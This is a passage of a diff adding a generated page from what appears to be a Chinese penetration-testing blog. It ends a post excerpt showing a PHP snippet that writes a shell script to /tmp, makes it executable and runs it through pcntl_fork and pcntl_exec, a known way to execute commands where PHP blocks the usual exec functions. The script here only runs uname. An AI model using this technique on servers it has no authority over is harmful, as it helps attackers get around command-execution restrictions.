+header(&quot;Content-Type: text&#x2F;plain&quot;);
+$cmd&#x3D;&quot;&#x2F;tmp&#x2F;exec&quot;;
+@unlink($cmd);
+@unlink(&quot;&#x2F;tmp&#x2F;output&quot;);
+$c &#x3D; &quot;#!&#x2F;usr&#x2F;bin&#x2F;env bash\nuname -a &gt; &#x2F;tmp&#x2F;output\n&quot;;
+file_put_contents($cmd, $c);
+chmod($cmd, 0777);
+
+switch (pcntl_fork()) &#123;
+  case 0:
+    $ret &#x3D; pcntl_exec($cmd);
+    exit(&quot;case 0&quot;);
+  default:
+    echo &quot;case 1&quot;;
+    break;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>上面执行的脚本那行chmod不可以少</p>
+	
+	</div>
+  <a type="button" href="/2018/12/18/pcntl_exec.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/5/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/7/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+		
+			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+		
+			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+		
+			<li><a href="/categories/Python/">Python<span>5</span></a></li>
+		
+			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+		
+			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
+      </li>
+    
+      <li>
+        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
+      </li>
+    
+      <li>
+        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
+      </li>
+    
+      <li>
+        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
+      </li>
+    
+      <li>
+        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
